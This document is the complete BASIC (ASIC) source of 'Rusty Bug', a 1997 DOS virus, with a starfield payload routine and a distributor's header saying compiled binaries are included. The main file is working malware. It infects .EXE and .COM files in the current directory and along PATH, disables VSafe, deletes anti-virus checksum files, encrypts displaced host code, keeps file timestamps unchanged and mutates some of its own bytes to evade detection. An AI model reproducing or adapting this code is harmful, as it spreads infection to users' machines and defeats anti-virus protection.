Rustbug
Casio

[Executioner: There are two source files here.  The compiled versions, the
ASI library and the executable version of Rustbug are in the RUSTBUG.ZIP
file contained in this distribution.]

RUSTBUG.ASI
-----------------------------------------------------------------------------

dim virus_data(5850)
dim host_data(5850)
call sub "ibcritinit"
randomize

rem Direct Action file infecting virus...
rem coded by Gremlin, aka Casio.
rem on 4-28-1997, started at 4:30pm....
rem Rusty Bug virus... v1.0

weedmsg$="þ [RuSTY BuG] þ v1.0 - CASiO UsA 1997"
killfil1$="anti-vir.dat"
killfil2$="chklist.ms"
killfil3$="chklist.cps"
notouch1$="COMMAND.COM"
notouch2$="START.EXE"
exe$="*.exe"
com$="*.com"
rustkey=172
rem And now the real fun part, bunch of temp calls to decode our information
rem above :)

temp$=weedmsg$
gosub decode_mess:
weedmsg$=output$

temp$=killfil1$
gosub decode_mess:
killfil1$=output$

temp$=killfil2$
gosub decode_mess:
killfil2$=output$

temp$=killfil3$
gosub decode_mess:
killfil3$=output$

temp$=notouch1$
gosub decode_mess:
notouch1$=output$

temp$=notouch2$
gosub decode_mess:
notouch2$=output$

temp$=exe$
gosub decode_mess:
exe$=output$

temp$=com$
gosub decode_mess:
com$=output$

newattr=0
gosub vsafe_toggle:
vsafebak=cx
gosub toast_them:
call sub "exename" hostname$
yourparm$=command$
yourparm$=ltrim$(yourparm$)
yourparm$=rtrim$(yourparm$)
yourparm$=" "+yourparm$

rem My new WEED virus! Oh so much more deadly! So much more spiffy!

filename$=hostname$
hostsize&=filelen(filename$)
virus_size=5850
virus_size&=5850&
gosub get_attr:
oldattr=newattr
newattr=0
gosub set_attr:
gosub open_file:
bytesize=virus_size
dx=varptr(virus_data(0))
gosub read_file:
gosub close_file:
newattr=oldattr
gosub set_attr:

rem Ok, now change bytes 5728 to 5850 randomly.. hehe, Semi-Poly :-)
for a=5728 to 5850
b=rnd(0)
b=b mod 255
b=b+1
c=virus_data(a)
c=c+b
virus_data(a)=c
next a

rem Ok, now infect files presently in current directory!
subdir=0
proc$=exe$
gosub start_virus:
proc$=com$
gosub start_virus:

rem Ok, now were going to target files along the path :)
     for n=0 to 100
          call sub "path", n, virupath$
          i=LEN(virupath$)
          if i=0 then done:
          b$=right$(virupath$,1)
        if b$<>"\" then
        virupath$=virupath$+"\"
        endif
        out1$=exe$
        out2$=com$
        subdir=1
        proc$=virupath$+out1$
        gosub start_virus:
        proc$=virupath$+out2$
        gosub start_virus:
        next n



done:
gosub nuke_virus:

rem payload decision code.. hehehehe :-)
a=rnd(0)
a=a mod 10
a=a+1
if a=1 then
rem Ok, run Stars Section, if they press "/" we allow them to run
rem original program!
call sub "Stars_heh"
endif
if a=7 then
rem Time to print message! :)
print weedmsg$
a=5*18
gosub pause_exec:
endif

rem Ok, pass control to host...
call hostname$, yourparm$

rem trash any checksum files that might have been created since
rem the host was run...Current Directory only...
newattr=0
gosub vsafe_toggle:
subdir=0
gosub toast_them:

rem re-infect the host... :-)
filename$=hostname$
gosub lets_infect:

rem Hmm, lets see if our new host was able to make any files!
subdir=0
proc$=exe$
gosub start_virus:
proc$=com$
gosub start_virus:
gosub toast_them:
newattr=vsafebak
gosub vsafe_toggle:
end
rem We have completed replication. all stop!

start_virus:
gosub toast_them:
errcode=0
error=0
attr=6
kewl=0
do_not_proceed=0
infected=0
search$=proc$
attrib=6
filename$=find first (search$, attrib)
if error>0 then done_finding:
  t1$=ucase$(filename$)
  if t1$=notouch1$ then
  do_not_proceed=1
  endif
  if t1$=notouch2$ then
  do_not_proceed=1
  endif
  if do_not_proceed=0 then
  if subdir=1 then
  filename$=virupath$+filename$
  endif
  gosub infect_check:
if infected=0 then
gosub lets_infect:
endif
endif
while errcode=0
do_not_proceed=0
filename$=find continue
if error>0 then done_finding:

  t1$=ucase$(filename$)
  if t1$=notouch1$ then
  do_not_proceed=1
  endif
  if t1$=notouch2$ then
  do_not_proceed=1
  endif
  if do_not_proceed=0 then
  if subdir=1 then
  filename$=virupath$+filename$
  endif
  gosub infect_check:
if infected=0 then
gosub lets_infect:
endif
endif
        if kewl>4 then
         errcode=1
         endif
   WEND

done_finding:
return

Lets_infect:
hostsize&=filelen(filename$)
gosub get_attr:
oldattr=newattr
newattr=0
gosub set_attr:
gosub open_file:
gosub get_fdt:
bytesize=virus_size
dx=varptr(host_data(0))
gosub read_file:
move_way&=0&
gosub move_file_pointer:
bytesize=virus_size
dx=varptr(virus_data(0))
gosub write_file:
move_way&=hostsize&
gosub move_file_pointer:
gosub enc_host:
dx=varptr(host_data(0))
bytesize=virus_size
gosub write_file:
gosub set_fdt:
kewl=kewl+1
gosub close_file:
newattr=oldattr
gosub set_attr:
error=0
return


REM ******* SYSTEM SUB-ROUTINES BELOW THIS LINE. DO NOT TREAD HERE!
REM ******* THESE AREAS MUST NOT BE FOOLED WITH!

get_attr:
AX = &HEX4300
DX = VARPTR(Filename$)
INT86(&HEX21,AX,NA,CX,DX,NA,NA,NA,NA,NA)
newattr=cx
return

set_attr:
AX = &HEX4301
DX = VARPTR(Filename$)
CX = NewAttr
INT86(&HEX21,AX,NA,CX,DX,NA,NA,NA,NA,NA)
return

vsafe_toggle:
ax=&hexfa02
dx=&hex5945
bx=newattr
int86(&hex16,ax,bx,cx,dx,na,na,na,na,na)
return

get_fdt:
if file_handle>4 then
AX=&HEX5700
BX=FILE_HANDLE
INT86(&HEX21,AX,BX,CX,DX,NA,NA,NA,NA,NA)
NEWDATE=CX
NEWTIME=DX
endif
RETURN

set_fdt:
if file_handle>4 then
AX=&HEX5701
BX=FILE_HANDLE
CX=NEWDATE
DX=NEWTIME
INT86(&HEX21,AX,BX,CX,DX,NA,NA,NA,NA,NA)
endif
RETURN

chklist:
temp1$=filename$
filename$=kill_this$
if subdir=1 then
filename$=virupath$+filename$
endif
newattr=0
gosub set_attr:
kill filename$
filename$=temp1$
return

rem DOS int file i/o driven code beyond this point :)

rem ax=&hex3d00
rem ax opens file for read in this mode :-)
rem ax=&hex3d01
rem ax opens file for write in this mode :-)
rem ax=&hex3d02
rem ax opens file for read/write access :) hehehe

open_file:
AX=&HEX3D02
DX = VARPTR(Filename$)
INT86(&HEX21,AX,NA,na,DX,NA,NA,NA,NA,NA)
file_handle=ax
return

write_file:
rem this routine will write selected bytes at whatever current position
rem from whatever buffer i choose into the file.
rem if the routine did not write all data ax will not equal cx upon
rem return from int call.
rem define dx register before calling this routine to point to the
rem memory address of the buffer area you want to write from. like so:
rem dx=varptr(buffer(0))
rem cx is how many bytes to write :)
if file_handle>4 then
ax=&hex4000
bx=file_handle
cx=bytesize
int86(&hex21,ax,bx,cx,dx,na,na,na,na,na)
byteswritten=ax
endif
return

read_file:
rem as the name implies, it reads bytes into a buffer. :-)
rem as with write_file, you need to predefine the dx register for the
rem buffer where you want the info stored. Like so: dx=varptr(buffer(0))
rem if you don't, this routine will not work, or will overwrite some
rem other section of memory. And for virus coding, this is very bad! :)
rem cx register is how many bytes to read :)
if file_handle>4 then
ax=&hex3f00
bx=file_handle
cx=bytesize
int86(&hex21,ax,bx,cx,dx,na,na,na,na,na)
bytesread=ax
endif
return

close_file:
rem This routine will close the selected file.
rem do not try to close handle 2, very nasty... :-(
if file_handle>4 then
ax=&hex3e00
bx=file_handle
int86(&hex21,ax,bx,na,na,na,na,na,na,na)
endif
return

move_file_pointer:
method=0
call sub "fseek" file_handle, move_way&, method, errcode
return

enc_host:
z=rustkey
rem Routine to encrypt the host data... We encrypt it before
rem appending. Yea, the encryption is lame... But it serves it's
rem purpose fine.
for x=0 to virus_size
y=x+z
a=host_data(x)
a=a+x
a=a+y
z=z+&hex305
host_data(x)=a
next x
return

dec_host:
z=rustkey
rem Routine to decrypt the host data... We need to decrypt it before
rem replacing it and passing control to it. And yes, the decryption
rem sequence is lame... But, I don't give a fuck!
for x=0 to virus_size
y=x+z
a=host_data(x)
a=a-x
a=a-y
z=z+&hex305
host_data(x)=a
next x
return

infect_check:
infected=0
gosub get_attr:
newattr=oldattr
newattr=0
gosub set_attr:
sig$=""
open"r",1,filename$
a=filepos(1,eof)
if a<virus_size then
infected=1
goto exit_infect_check:
endif
a=filepos(1,28)
for z=1 to 4
input #1,y$ byte
sig$=sig$+y$
next z
newattr=oldattr
gosub set_attr:
if sig$="žœ“" then
infected=1
endif

exit_infect_check:
close 1
return

strip_garbage:
open"r",1,filename$
a=filepos(1,hosttemp&)
print #1,"" NONULL
CLOSE 1
gosub open_file:
gosub set_fdt:
gosub close_file:
return

pause_exec:
REM (5 * 18.2 clock-ticks-per-second = 91)
TickOne = TIMER
FOR i = 1 TO a
   TickTwo = TickOne
   WHILE TickTwo = TickOne
       TickOne = TIMER
   WEND
NEXT i
RETURN

toast_them:
kill_this$=killfil1$
gosub chklist:
kill_this$=killfil2$
gosub chklist:
kill_this$=killfil3$
gosub chklist:
return

decode_mess:
output$=""
rem This routine decrypts our tables in the beginning to useable material
rem For run-time use only. The data in the exe/com is not decrypted!
r=len(temp$)
for x=1 to r
a$=mid$(temp$,x,1)
a=asc(a$)
a=a+127
a$=chr$(a)
output$=output$+a$
next x
return

nuke_virus:
rem This routine removes the virus from the infected file
rem It also restores the file prior to passing control to it...
filename$=hostname$
hostsize&=filelen(filename$)
gosub get_attr:
oldattr=newattr
newattr=0
gosub set_attr:
gosub open_file:
gosub get_fdt:
hosttemp&=hostsize&-virus_size&
move_way&=hosttemp&
gosub move_file_pointer:
bytesize=virus_size
dx=varptr(host_data(0))
gosub read_file:
move_way&=0&
gosub move_file_pointer:
gosub dec_host:
dx=varptr(host_data(0))
bytesize=virus_size
gosub write_file:
gosub set_fdt:
gosub close_file:
gosub strip_garbage:
newattr=oldattr
gosub set_attr:
return


STARS.ASI
-----------------------------------------------------------------------------

sub "Stars_heh"
REM You can add more or less stars by changing the values in the DIM
REM statements and the the NumStars variable

REM Arrays to hold our stars x,y,plane and colors
REM We have to use 4 different arrays because ASIC doesn't support
REM user defined types(i.e. structures).

DIM Star_X(100)
DIM Star_Y(100)
DIM Star_P(100)
DIM Star_C(100)

REM Variables to hold the old x,y positions so we don't have to erase the
REM whole screen

DIM Old_X(100)
DIM Old_Y(100)

REM Variable for the Number of stars we want
NumStars=100

REM Variables to move the stars at different "velocities"
velocity_1=1
velocity_2=2
velocity_3=4

REM Variable to store our visible and hidden video page
VisiblePage=&hex0000
HiddenPage=&hex0100

REM Variable to store the color black
ColorBlack=&hex0C00

REM Set the video mode to 320x200, 16 colors
REM We use this mode because we have multiple video pages and we can use
REM page flipping techniques to animate the starfield
SCREEN 7


REM Main program loop starts here
GOSUB InitStarfield:

AnimateLoop:
 GOSUB UpdateStarfield:
 GOSUB DrawStarfield:
 GOSUB ShowPage:

Wait:
 K$=INKEY$
 IF K$ = "" THEN
  GOTO AnimateLoop:
 ELSE
  SCREEN 0
  ENDsub
 ENDIF

REM Here we setup the starfield
InitStarfield:
RANDOMIZE

 REM Fill in the x,y positions
 FOR count=0 TO NumStars
  X=RND(0)
  X=X MOD 320
  Y=RND(0)
  Y=Y MOD 200
  Star_X(count)=X
  Star_Y(count)=Y

  Plane=RND(0)
  Plane=Plane MOD 3
  IF Plane = 0 THEN
   Star_P(count) = 1
   Star_C(count) = &hex0C08
  ENDIF

  IF Plane = 1 THEN
   Star_P(count) = 2
   Star_C(count) = &hex0C07
  ENDIF

  IF Plane = 2 THEN
   Star_P(count) = 3
   Star_C(count) = &hex0C0F
  ENDIF
 NEXT count
RETURN

REM Here's where we draw the starfield
DrawStarfield:
 FOR count = 0 TO NumStars
  REM We use the BIOS pixel setting routine so that we can specify which
  REM video page to draw on
  AX=Star_C(count)
  BX=HiddenPage
  CX=Star_X(count)
  DX=Star_Y(count)
  INT86(&hex10,AX,BX,CX,DX,NA,NA,NA,NA,NA)
 NEXT count
RETURN

REM Here's where we flip the video pages
ShowPage:
 IF VisiblePage=&hex0000 THEN
  AX=&hex0501
  HiddenPage=&hex0000
  VisiblePage=&hex0100
 ELSE
  AX=&hex0500
  HiddenPage=&hex0100
  VisiblePage=&hex0000
 ENDIF

 REM Now let the BIOS flip the page
 INT86(&hex10,AX,NA,NA,NA,NA,NA,NA,NA,NA)

 REM Now we clear the hidden page to black
 FOR count=0 to NumStars
  AX=ColorBlack
  BX=HiddenPage
  CX=Old_X(count)
  DX=Old_Y(count)
  INT86(&hex10,AX,BX,CX,DX,NA,NA,NA,NA,NA)
 NEXT count
RETURN

REM Animates the starfield by moving the pixels in the x direction
UpdateStarfield:
 FOR count=0 TO NumStars

 REM Save the old x,y positions
 Old_X(count)=Star_X(count)
 Old_Y(count)=Star_Y(count)

  IF Star_P(count)=1 THEN
   Star_X(count)=Star_X(count)+velocity_1
  ENDIF

  IF Star_P(count)=2 THEN
   Star_X(count)=Star_X(count)+velocity_2
  ENDIF

  IF Star_P(count)=3 THEN
   Star_X(count)=Star_X(count)+velocity_3
  ENDIF

  REM Clip the x coordinate to the screen
  IF Star_X(count) > 319 THEN
   Star_X(count) = Star_X(count) - 320
  ENDIF

  IF Star_X(count) < 0 THEN
   Star_X(count) = Star_X(count) + 319
  ENDIF
 NEXT count
RETURN


